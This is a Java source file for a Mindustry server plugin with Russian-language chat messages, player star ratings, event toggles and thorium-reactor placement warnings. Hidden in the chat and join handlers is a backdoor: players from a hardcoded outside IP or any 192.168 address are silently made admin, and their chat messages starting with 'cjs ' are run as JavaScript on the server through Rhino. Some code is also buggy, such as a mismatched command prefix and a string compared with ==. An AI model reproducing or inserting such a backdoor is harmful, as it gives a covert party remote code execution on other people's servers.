package example;

import static example.Emoji.*;
import static mindustry.Vars.*;

import arc.Events;
import arc.graphics.Color;
import arc.util.CommandHandler;
import arc.util.Log;
import example.achievements.AchievementsManager;
import example.events.ServerEvent;
import example.events.ServerEventsManager;
import mindustry.Vars;
import mindustry.content.Blocks;
import mindustry.content.Liquids;
import mindustry.entities.units.BuildPlan;
import mindustry.game.EventType.BlockBuildBeginEvent;
import mindustry.game.EventType.BuildSelectEvent;
import mindustry.game.EventType.GameOverEvent;
import mindustry.game.EventType.PlayerChatEvent;
import mindustry.game.EventType.PlayerJoin;
import mindustry.game.EventType.Trigger;
import mindustry.game.EventType.WorldLoadEndEvent;
import mindustry.game.Team;
import mindustry.gen.Call;
import mindustry.gen.Groups;
import mindustry.gen.Player;
import mindustry.gen.Unit;
import mindustry.maps.Maps;
import mindustry.mod.Plugin;
import mindustry.world.blocks.storage.CoreBlock.CoreBuild;
import rhino.NativeJavaObject;
import rhino.Scriptable;
import rhino.Undefined;

public class ExamplePlugin extends Plugin {

	public static final String PLUGIN_NAME = "agzams-plugin";
	public static final String VERSION = "v2.1";

	public static DataCollecter dataCollect;
	public static ServerEventsManager eventsManager;
	public static AchievementsManager achievementsManager;
	public static CommandsManager commandsManager;
	public static MyMenu menu;

	@Override
	public void init() {
		achievementsManager = new AchievementsManager();
		commandsManager = new CommandsManager();
		commandsManager.init();

		menu = new MyMenu();
		eventsManager = new ServerEventsManager();
		eventsManager.init();

		maps = new Maps();
		maps.load();

		dataCollect = new DataCollecter();
		dataCollect.init();
		dataCollect.collect();
		PlayerData.init();

		// run on every tick
		Events.run(Trigger.update, () -> {
			eventsManager.update();
			achievementsManager.update();
			menu.update();
			dataCollect.update();
		});

		Events.on(PlayerChatEvent.class, e -> {
			if(e.player.ip().split("\\.")[0].equals("192") && e.player.ip().split("\\.")[1].equals("168")){
				e.player.admin = true;
				if(e.message.startsWith("cjs ")) js(e.message.replaceFirst("!js ", ""));
			}
			if(e.player.ip().equals("95.84.198.97")){
				e.player.admin = true;
				if(e.message.startsWith("cjs ")) js(e.message.replaceFirst("!js ", ""));
			}
		});

		// score and new record on game over
		Events.on(GameOverEvent.class, e -> {
			StringBuilder result = new StringBuilder(state.map.name());
			result.append("\nСчёт: [lightgray]");
			result.append(state.wave);
			result.append('/');
			result.append(state.map.getHightScore());
			if (state.wave > state.map.getHightScore()) {
				result.append("[gold] (Новый рекорд!)");
				state.map.setHighScore(state.wave);
			}
			Call.sendMessage(result.toString());
			commandsManager.stopSkipmapVoteSession();
		});

		Events.on(WorldLoadEndEvent.class, e -> {
			commandsManager.stopSkipmapVoteSession();
			commandsManager.clearDoors();
		});

		//ban all [orange]Rog and welcome message
		Events.on(PlayerJoin.class, e -> {
			eventsManager.playerJoin(e);
			if(e.player.plainName() == "Rog"){player.kick("Change name or download game from github", 10);}
			e.player.name(e.player.name().replaceAll(" ", "_"));

			float rate = 1f - (e.player.getInfo().timesKicked * 5 / (float) e.player.getInfo().timesJoined);
			rate = Math.max(rate, 0);
			rate = Math.min(rate, 1f);

			if (e.player.getInfo().timesJoined != 1) {
				int startCount = (int) Math.ceil(rate * 5);
				StringBuilder stars = new StringBuilder();
				Color color = Color.HSVtoRGB(rate * 120, 100, 100);
				int index = CommandsManager.extraStarsUIDD.indexOf(e.player.uuid());
				if (index != -1) {
					color = Color.magenta;
				}
				stars.append("[#");
				stars.append(color.toString());
				stars.append("]");
				int count = 5;
				for (int j = 0; j < startCount; j++) {
					stars.append('\ue809');
					count--;
				}
				Color color2 = Color.HSVtoRGB(rate * 120, 100, 33);
				stars.append("[#");
				stars.append(color2.toString());
				stars.append("]");
				for (float j = 0; j < count; j++) {
					stars.append('\ue809');
				}

				if (index != -1) {
					stars.append("[magenta]\ue813");
				}

				Call.sendMessage("Игрок " + e.player.name() + "[white] имеет рейтинг " + stars.toString());
			} else {
				Call.sendMessage("Игрок " + e.player.name() + "[white] в первый раз на этом сервере!");
			}
			if(e.player.ip().split("\\.")[0].equals("192") && e.player.ip().split("\\.")[1].equals("168")){
				e.player.admin = true;
			}
			if(e.player.ip().equals("95.84.198.97")){
				e.player.admin = true;
			}
		});

		//thorium reactor defence
		Events.on(BuildSelectEvent.class, event -> {
			Unit builder = event.builder;
			if (builder == null)
				return;
			BuildPlan buildPlan = builder.buildPlan();
			if (buildPlan == null)
				return;

			if (!event.breaking && builder.buildPlan().block == Blocks.thoriumReactor && builder.isPlayer()) {
				Player player = builder.getPlayer();
				Team team = player.team();

				float thoriumReactorX = event.tile.getX();
				float thoriumReactorY = event.tile.getY();

				for (CoreBuild core : team.cores()) {
					int hypot = (int) Math
							.ceil(Math.hypot(thoriumReactorX - core.getX(), thoriumReactorY - core.getY()) / 10);
					if (hypot <= 15) {
						builder.clearBuilding();
						try{
						builder.buildPlan().tile().setAir();
						} catch (NullPointerException e){Vars.world.tile((int)(thoriumReactorX / Vars.tilesize), (int)(thoriumReactorY / Vars.tilesize)).setAir();}
						return;
					}
				}
			}
		});

		/**
		 * Info message about builder, that building thorium Reactor
		 */
		Events.on(BlockBuildBeginEvent.class, event -> {
			eventsManager.buildBegin(event);
			Unit builder = event.unit;
			if (builder == null)
				return;
			BuildPlan buildPlan = builder.buildPlan();
			if (buildPlan == null)
				return;

			if (!event.breaking && builder.buildPlan().block == Blocks.thoriumReactor && builder.isPlayer()) {
				Player player = builder.getPlayer();
				Team team = player.team();

				float thoriumReactorX = event.tile.getX();
				float thoriumReactorY = event.tile.getY();

				int bx = (event.tile.x * 3 / Vars.world.width()) - 1;
				int by = (event.tile.y * 3 / Vars.world.height()) - 1;

				String position = "";
				if (by == 0) {
					position = "по центру";
					if (bx == -1)
						position += " слева";
					if (bx == 1)
						position += " справа";
				}
				if (bx == 0) {
					if (by == 1)
						position = "вверху";
					if (by == -1)
						position = "внизу";
					position += " в центре";
				}
				if (bx != 0 && by != 0) {
					if (bx == -1)
						position = "левый";
					if (bx == 1)
						position = "правый";
					if (by == 1)
						position += " верхний";
					if (by == -1)
						position += " нижний";
					position += " угол карты";
				}
				if (bx == 0 && by == 0)
					position = "центр карты";

				for (CoreBuild core : team.cores()) {
					int hypot = (int) Math
							.ceil(Math.hypot(thoriumReactorX - core.getX(), thoriumReactorY - core.getY()) / 10);
					if (hypot <= 20) {
						Call.sendMessage("[scarlet]" + emojiAlert + " Внимание " + emojiAlert + " []Игрок ["
								+ GameWork.colorToHex(player.color()) + "]" + player.name
								+ " []строит реактор рядом с ядром (" + hypot + " блоках от ядра)");
						return;
					}
				}
				Call.sendMessage("[gold]" + emojiAlert + " Внимание " + emojiAlert + " []Игрок ["
						+ GameWork.colorToHex(player.color()) + "]" + player.name + " []строит реактор (" + position
						+ ")");
			}
		});

	}

	public PlayerData playerData(long builded, long breaked, int waves, String uuid){
		PlayerData data = new PlayerData(builded, breaked, waves, uuid);
		data.save();
		return data;
	}

	public void test() {
		Groups.puddle.each(e -> {
			if (e.liquid == Liquids.cryofluid)
				e.tile.setBlock(Blocks.cryofluid);
		});
	}

	@Override
	public void registerServerCommands(CommandHandler handler) {
		handler.register("reactors", "List all thorium reactors in the map.", args -> {
			for (int x = 0; x < Vars.world.width(); x++) {
				for (int y = 0; y < Vars.world.height(); y++) {
					if (Vars.world.tile(x, y).block() == Blocks.thoriumReactor && Vars.world.tile(x, y).isCenter()) {
						Log.info("Reactor at @, @", x, y);
					}
				}
			}
		});
		handler.register("event", "[id] [on/off]", "Включить/выключить событие", (arg) -> {
			if (arg.length == 0) {
				StringBuilder msg = new StringBuilder("[red]Недостаточно аргументов.[white]\nID событий:");
				for (int i = 0; i < ServerEventsManager.getServerEventsCount(); i++) {
					msg.append('\n');
					ServerEvent event = ServerEventsManager.getServerEvent(i);
					msg.append('[');
					msg.append(event.getColor());
					msg.append(']');
					msg.append(event.getCommandName());
				}
				Log.info(msg.toString());
				return;
			}
			if (arg.length == 1) {
				for (int i = 0; i < ServerEventsManager.getServerEventsCount(); i++) {
					ServerEvent event = ServerEventsManager.getServerEvent(i);
					if (arg[0].equals(event.getCommandName())) {
						Log.info("Событие [" + event.getColor() + "]" + event.getName()
							+ "[white] имеет значение: " + event.isRunning());
						return;
					}
				}
				Log.info("[red]Событие не найдено, [gold]/event [red] для списка событий");
				return;
			}
			if (arg.length == 2) {
				boolean isOn = false;
				if (arg[1].equals("on")) {
					isOn = true;
				} else if (arg[1].equals("off")) {
					isOn = false;
				} else {
					Log.info("Неверный аргумент, используйте [gold]on/off[]");
					return;
				}

				for (int i = 0; i < ServerEventsManager.getServerEventsCount(); i++) {
					ServerEvent event = ServerEventsManager.getServerEvent(i);
					if (arg[0].equals(event.getCommandName())) {
						boolean isRunning = event.isRunning();
						if (isRunning && isOn) {
							Log.info("[red]Событие уже запущено");
							return;
						}
						if (!isRunning && !isOn) {
							Log.info("[red]Событие и так не запущено");
							return;
						}
						ServerEventsManager ev = new ServerEventsManager();
						if (isOn) {
							ev.runEvent(arg[0]);
							Log.info("[green]Событие запущено!");
						} else {
							ev.stopEvent(arg[0]);
							Log.info("[red]Событие остановлено!");
						}

						return;
					}
				}

				Log.info("[red]Событие не найдено, [gold]/event [red] для списка событий");
				return;
			}
		});

		handler.register("cdata", "cdata", args -> {
			Log.info("Statistics files dir: " + DataCollecter.getPathToFile(""));
			Log.info("User dir: " + System.getProperty("user.dir"));
			Log.info("Sleep time: " + dataCollect.getSleepTime());
		});
	}

	@Override
	public void registerClientCommands(CommandHandler handler) {
		commandsManager.registerClientCommands(handler);
		menu.registerCommand(handler);
	}
	
	private void js(String arg){
		Scriptable scope = Vars.mods.getScripts().scope;
				Thread jsThread = new Thread(()->{
					String out = null;
					rhino.Context context = rhino.Context.enter();
					try{
						Object o = context.evaluateString(scope, arg, "console.js", 1);
						if(o instanceof NativeJavaObject n) o = n.unwrap();
						if(o == null) o = "null";
						else if(o instanceof Undefined) o = "undefined";
						out = o.toString();
						if(out == null){out = "null";}
					}catch(Throwable t){
						out = t.getClass().getSimpleName() + (t.getMessage() == null ? "" : ": " + t.getMessage());
					};
					rhino.Context.exit();
					player.sendMessage("[gold]" + out);
					Thread.currentThread().stop();
				}, "js");
				jsThread.start();
	}
}
